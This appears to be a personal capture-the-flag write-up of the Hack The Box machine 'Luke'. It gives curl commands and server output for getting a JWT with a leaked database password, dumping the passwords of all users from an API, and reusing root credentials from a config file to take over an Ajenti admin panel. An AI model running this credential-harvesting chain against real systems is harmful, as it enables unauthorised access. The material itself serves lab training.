+++
title = "Luke"
date = 2019-09-14
[taxonomies]
tags = ["hackthebox"]
+++

1. Port scans show TCP ports 21, 22, 80, 3000, 8000 are open.

2. The FTP service allows anonymous FTP access so I checked that out. It doesn't contain any useful files besides a .txt file from a user about setting up a web server access for demonstration purposes.

3. The SSH service isn't useful to us right now, we just keep that in mind that we have a service that we can try it on once we enumerate the other services for credentials.

4. Enumerating port 80 showed up a bootstrap page that doesn't have any useful links to administration panels or hints of what CMS it uses besides bootstrap. I began enumerating the port 80 and found this link: [http://luke/config.php](http://luke/config.php)

	```shell
	$dbHost = 'localhost'; $dbUsername = 'root'; $dbPassword = 'Zk6heYCyv6ZE9Xcg'; $db = "login"; $conn = new mysqli($dbHost, $dbUsername, $dbPassword,$db) or die("Connect failed: %s\n". $conn -> error);
	```

	Not sure what to do with this information yet, I'll keep this aside and keep enumerating the other services.

	Another interesting link came up in the dirbuster searches: [http://luke/package.json](http://luke/package.json)

	This JSON file tells us that Bootstrap 4.1.2 is most likely installed. I'll keep this aside just in case I could search for exploits against it.

	![htb-luke-packagejson](htb-luke-packagejson.png)

5. Enumerating port 3000 shows it's running some sort of json service as it replies back with an HTTP request that looks like this:

	```shell
	{"success":false,"message":"Auth token is not supplied"}
	```

	A quick Google search that this message is a JWT Token authentication service. I'll keep this aside once again and finish up my enumeration process to see the bigger picture of what this machine is about. Gobuster also showed there is a directory named `/login` and `/users`.

7. Enumerating port 8000 shows it's running a platform called Ajenti. A quick Google search shows it's a platform made for managing a server. I think this is a potential entry to gain access to what I need to gain user land. I tried the basic possible login and passwords but no luck. Looking for possible exploits only shows a viable XSS exploit but requires that you need to log into Ajenti first.

8. Circling back to what we have found so far, the JWT Token page must be related to generating a password I would assume.

	I don't know what JWT Token was until I was working on this machine. A quick Google search showed a Medium article to show you how to create a POST request to generate a token and GET request with the authorized token to obtain more information.

	After some trial and error, here is my working POST request to obtain the JWT Token using cURL:

	```shell
	curl --header "Content-Type: application/json" --request POST --data '{"password":"Zk6heYCyv6ZE9Xcg", "username":"admin"}' http://luke:3000/login
	```

	The server response was a success!

	```shell
	{"success":true,"message":"Authentication successful!","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTYxNDA1NDQxLCJleHAiOjE1NjE0OTE4NDF9.kMu4ZFovwboGK0X348oz52Fwa_YXY7tKOMoRr8LbU8Y"}
	```

	One thing to note about the cURL command is that I had to change the username from root to admin to get a response. This isn't something I would have thought of and I got a hint from the Discord chat. Lesson learned to enumerate even these json-type services.

9. Now with this JWT Token in hand, what do we do with this? It's time to craft a GET response and see what we can find out in the /users directory that we found earlier.

	```shell
	curl -X GET -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTYxNDA1ODg3LCJleHAiOjE1NjE0OTIyODd9.QBBrRf7x5MPx1GkcJRQZxtShmP9az9RpRWqQyq9VHzM' http://luke:3000/users
	```

	The server responded with my request!

	```shell
	[{"ID":"1","name":"Admin","Role":"Superuser"},{"ID":"2","name":"Derry","Role":"Web Admin"},{"ID":"3","name":"Yuri","Role":"Beta Tester"},{"ID":"4","name":"Dory","Role":"Supporter"}]
	```

10. This is surprising. I expected to generate a response with username and passwords but only showed username instead. If it's one thing I learned from before, even these json-type services can be enumerated further. I tried to play around with the variables in the json response and see if I get a response.

	```shell
	curl -X GET -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTYxNDA1ODg3LCJleHAiOjE1NjE0OTIyODd9.QBBrRf7x5MPx1GkcJRQZxtShmP9az9RpRWqQyq9VHzM' http://luke:3000/users/admin
	```

	And indeed I did so I proceed to enumerate all the users.

	```shell
	{"name":"Admin","password":"WX5b7)>/rp$U)FW"}
	{"name":"Derry","password":"rZ86wwLvx7jUxtch"}
	{"name":"Yuri","password":"bet@tester87"}
	{"name":"Dory","password":"5y:!xa=ybfe)/QD"}
	```

11. Now that we have username and passwords, which services will allow me to login? Seeing that I found 3 places to login so far in port 22, 80, 8000, I tried those and failed. Wondering where if I missed something in my enumeration process and indeed I did. Don't just rely on 1 tool to do all your scans as I did. I only used Gobuster for my enumeration process and I should have used dirbuster with recursive mode turned on. Once I did, it found a `/management` folder in port 80.

	The folder was protected by HTTP Basic Auth but was bypassed as I used Derry's login. Once logged in, there are couple of files displayed but only the `config.json` file had interesting data.

	```shell
	{
	    "users": {
	        "root": {
	            "configs": {
	                "ajenti.plugins.notepad.notepad.Notepad": "{\"bookmarks\": [], \"root\": \"/\"}", 
	                "ajenti.plugins.terminal.main.Terminals": "{\"shell\": \"sh -c $SHELL || sh\"}", 
	                "ajenti.plugins.elements.ipmap.ElementsIPMapper": "{\"users\": {}}", 
	                "ajenti.plugins.munin.client.MuninClient": "{\"username\": \"username\", \"prefix\": \"http://localhost:8080/munin\", \"password\": \"123\"}", 
	                "ajenti.plugins.dashboard.dash.Dash": "{\"widgets\": [{\"index\": 0, \"config\": null, \"container\": \"1\", \"class\": \"ajenti.plugins.sensors.memory.MemoryWidget\"}, {\"index\": 1, \"config\": null, \"container\": \"1\", \"class\": \"ajenti.plugins.sensors.memory.SwapWidget\"}, {\"index\": 2, \"config\": null, \"container\": \"1\", \"class\": \"ajenti.plugins.dashboard.welcome.WelcomeWidget\"}, {\"index\": 0, \"config\": null, \"container\": \"0\", \"class\": \"ajenti.plugins.sensors.uptime.UptimeWidget\"}, {\"index\": 1, \"config\": null, \"container\": \"0\", \"class\": \"ajenti.plugins.power.power.PowerWidget\"}, {\"index\": 2, \"config\": null, \"container\": \"0\", \"class\": \"ajenti.plugins.sensors.cpu.CPUWidget\"}]}", 
	                "ajenti.plugins.elements.shaper.main.Shaper": "{\"rules\": []}", 
	                "ajenti.plugins.ajenti_org.main.AjentiOrgReporter": "{\"key\": null}", 
	                "ajenti.plugins.logs.main.Logs": "{\"root\": \"/var/log\"}", 
	                "ajenti.plugins.mysql.api.MySQLDB": "{\"password\": \"\", \"user\": \"root\", \"hostname\": \"localhost\"}", 
	                "ajenti.plugins.fm.fm.FileManager": "{\"root\": \"/\"}", 
	                "ajenti.plugins.tasks.manager.TaskManager": "{\"task_definitions\": []}", 
	                "ajenti.users.UserManager": "{\"sync-provider\": \"\"}", 
	                "ajenti.usersync.adsync.ActiveDirectorySyncProvider": "{\"domain\": \"DOMAIN\", \"password\": \"\", \"user\": \"Administrator\", \"base\": \"cn=Users,dc=DOMAIN\", \"address\": \"localhost\"}", 
	                "ajenti.plugins.elements.usermgr.ElementsUserManager": "{\"groups\": []}", 
	                "ajenti.plugins.elements.projects.main.ElementsProjectManager": "{\"projects\": \"KGxwMQou\\n\"}"
	            }, 
	            "password": "KpMasng6S5EtTy9Z", 
	            "permissions": []
	        }
	    }, 
	    "language": "", 
	    "bind": {
	        "host": "0.0.0.0", 
	        "port": 8000
	    }, 
	    "enable_feedback": true, 
	    "ssl": {
	        "enable": false, 
	        "certificate_path": ""
	    }, 
	    "authentication": true, 
	    "installation_id": 12354
	}
	```

	The config.json file contains a root and password. Now what do we do with this newly obtained credentials? I tried using it on the other login panels as we found earlier again. The root credentials was succcessful on port 8000, the Ajenti platform!

12. Once logged in, I was looking for a possible way to read the flag such as an editor or something. Luckily, there is a File Manager tool that we can read the user flag and even root flag. That was too easy.

![htb-luke-rootfs](htb-luke-rootfs.png)